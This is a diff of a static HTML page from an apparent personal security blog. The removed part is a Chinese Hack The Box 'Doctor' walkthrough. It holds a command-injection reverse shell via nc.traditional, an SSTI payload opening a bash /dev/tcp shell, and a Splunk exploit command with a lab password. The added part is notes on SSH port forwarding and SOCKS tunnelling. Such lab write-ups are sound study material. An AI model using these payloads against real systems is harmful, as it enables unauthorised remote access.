@@ -7,11 +7,11 @@
         
         
         
-        <link rel="shortcut icon" href="../img/favicon.ico">
-        <title>[HTB]Docter - hkk_blog</title>
-        <link href="../css/bootstrap-custom.min.css" rel="stylesheet">
-        <link href="../css/font-awesome.min.css" rel="stylesheet">
-        <link href="../css/base.css" rel="stylesheet">
+        <link rel="shortcut icon" href="../../img/favicon.ico">
+        <title>ssh隧道 - hkk_blog</title>
+        <link href="../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../css/base.css" rel="stylesheet">
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/darcula.min.css">
         <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
         <!--[if lt IE 9]>
@@ -19,8 +19,8 @@
             <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
         <![endif]-->
 
-        <script src="../js/jquery-1.10.2.min.js" defer></script>
-        <script src="../js/bootstrap-3.0.3.min.js" defer></script>
+        <script src="../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../js/bootstrap-3.0.3.min.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
         <script>hljs.initHighlightingOnLoad();</script> 
     </head>
@@ -39,7 +39,7 @@
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                     </button>
-                    <a class="navbar-brand" href="..">hkk_blog</a>
+                    <a class="navbar-brand" href="../..">hkk_blog</a>
                 </div>
 
                 <!-- Expanded navigation -->
@@ -47,22 +47,32 @@
                         <!-- Main navigation -->
                         <ul class="nav navbar-nav">
                             <li >
-                                <a href="..">Welcome to hkkblog</a>
+                                <a href="../..">Welcome to hkkblog</a>
                             </li>
-                            <li class="active">
-                                <a href="./">[HTB]Docter</a>
-                            </li>
-                            <li >
-                                <a href="../docker和phpstorm搭建php开发环境/">docker和phpstorm搭建php开发环境</a>
-                            </li>
-                            <li >
-                                <a href="../ssh隧道/">ssh隧道</a>
-                            </li>
-                            <li >
-                                <a href="../初探pickle反序列化/">初探pickle反序列化</a>
-                            </li>
-                            <li >
-                                <a href="../发财writeup/">HXB writeup</a>
+                            <li class="dropdown active">
+                                <a href="#" class="dropdown-toggle" data-toggle="dropdown">Articl <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li >
+    <a href="../[HTB]DT/">[HTB]Docter</a>
+</li>
+                                    
+<li >
+    <a href="../docker和phpstorm搭建php开发环境/">docker和phpstorm搭建php开发环境</a>
+</li>
+                                    
+<li class="active">
+    <a href="./">ssh隧道</a>
+</li>
+                                    
+<li >
+    <a href="../初探pickle反序列化/">初探pickle反序列化</a>
+</li>
+                                    
+<li >
+    <a href="../发财writeup/">HXB writeup</a>
+</li>
+                                </ul>
                             </li>
                         </ul>
 
@@ -73,12 +83,12 @@
                             </a>
                         </li>
                             <li >
-                                <a rel="next" href="..">
+                                <a rel="next" href="../docker和phpstorm搭建php开发环境/">
                                     <i class="fa fa-arrow-left"></i> Previous
                                 </a>
                             </li>
                             <li >
-                                <a rel="prev" href="../docker和phpstorm搭建php开发环境/">
+                                <a rel="prev" href="../初探pickle反序列化/">
                                     Next <i class="fa fa-arrow-right"></i>
                                 </a>
                             </li>
@@ -90,54 +100,42 @@
         <div class="container">
                 <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
     <ul class="nav bs-sidenav">
-        <li class="main active"><a href="#htbdocter">[HTB]Docter</a></li>
+        <li class="main active"><a href="#ssh">ssh隧道</a></li>
+            <li><a href="#_1">远程端口转发</a></li>
+            <li><a href="#socks">socks代理</a></li>
     </ul>
 </div></div>
                 <div class="col-md-9" role="main">
 
-<h1 id="htbdocter">[HTB]Docter</h1>
-<p><img alt="image-20201202204034122" src="../img/image-20201202204034122.png" /></p>
-<p>需要添加一条hosts</p>
-<blockquote>
-<p>10.10.10.209    doctors.htb</p>
-</blockquote>
-<p>首先nmap扫一波</p>
-<p><img alt="image-20201203172229375" src="../img/image-20201203172229375.png" /></p>
-<p>有登录框，注册一个用户，登陆上有一个留言界面，看大佬可以XSS反弹shell(: </p>
-<p>ps:涉及到我的知识盲区了</p>
-<p>利用的是nc的<code>-e``-c</code>，只有在nc.traditional版本中才有，而正常的ubuntu发行版是nc.openbsd</p>
-<p>不带<code>-e``-c</code></p>
-<p><img alt="" src="../img/image-20201202205447400.png" /></p>
-<p><img alt="image-20201202205525591" src="../img/image-20201202205525591.png" /></p>
-<p>利用</p>
-<blockquote>
-<p><img src=http://10.10.14.2/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.2'$IFS'4444')></p>
-</blockquote>
-<p><img alt="image-20201202210611483" src="../img/image-20201202210611483.png" /></p>
-<p><img alt="image-20201202210655333" src="../img/image-20201202210655333.png" /></p>
-<p>成功弹到shell，可以用python建立一个伪终端</p>
-<p><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></p>
-<p>看大佬还可以用ssti</p>
-<p>在<code>/archive</code>页面可以触发</p>
-<p><img alt="image-20201203155607423" src="../img/image-20201203155607423.png" /></p>
-<p>同样可以反弹shell</p>
-<pre><code>{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system'](&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1'&quot;)}}
+<h1 id="ssh">ssh隧道</h1>
+<p>ssh隧道常用参数</p>
+<pre><code>-C：压缩传输，提高传输速度
+-f ：将ssh传输转入后台执行，不占用当前的shell。
+-N：建立静默连接（建立了连接，但是看不到具体的会话）
+-g 允许远程主机连接本地用于转发的端口
+-L：本地端口转发
+-R：远程端口转发
+-D：动态转发（socks代理）
+-P：指定ssh端口
 </code></pre>
 
-<p>登陆上后我们是普通用户权限</p>
-<p>去home下还有一个用户shaun</p>
-<p>在/var/log/apache2下面有个backup，在里面发现重置密码流量，尝试登录</p>
-<p><img alt="image-20201203170240804" src="../img/image-20201203170240804.png" /></p>
-<p>登陆成功，但还是普通用户权限，无果</p>
-<p>开始nmap扫出了8089有个splunkd服务</p>
-<p>通过Splunk错误配置，可以进行本地提权或远程执行代码</p>
-<p>我们尝试使用获得的账户和密码来反弹shell，附上<a href="https://github.com/falipan/SplunkWhisperer2">github项目</a></p>
-<p>执行</p>
-<pre><code>python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.2 --username shaun --password Guitar123 --payload &quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1'&quot;
-</code></pre>
-
-<p><img alt="image-20201203195145214" src="../img/image-20201203195145214.png" /></p>
-<p>这样我们就拿到了root用户</p></div>
+<h3 id="_1">远程端口转发</h3>
+<blockquote>
+<p>ssh -NfR remote-ip:remote-port:localhost:local-port root@remoteip</p>
+</blockquote>
+<p>远程sshd_config需要设置</p>
+<blockquote>
+<p>AllowTcpForwarding yes</p>
+<p>GatewayPorts yes</p>
+</blockquote>
+<h3 id="socks">socks代理</h3>
+<blockquote>
+<p>ssh -NfD [localhost]:port root@localhost</p>
+</blockquote>
+<p>先在本地实现socks代理，再将socks代理端口通过隧道连接到公网</p>
+<blockquote>
+<p>ssh -NfR remote-ip:remote-port:localhost:socks-port root@remoteip</p>
+</blockquote></div>
         </div>
 
         <footer class="col-md-12">
@@ -145,11 +143,11 @@
             <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
         </footer>
         <script>
-            var base_url = "..",
+            var base_url = "../..",
                 shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
         </script>
-        <script src="../js/base.js" defer></script>
-        <script src="../search/main.js" defer></script>
+        <script src="../../js/base.js" defer></script>
+        <script src="../../search/main.js" defer></script>
 
         <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
     <div class="modal-dialog">
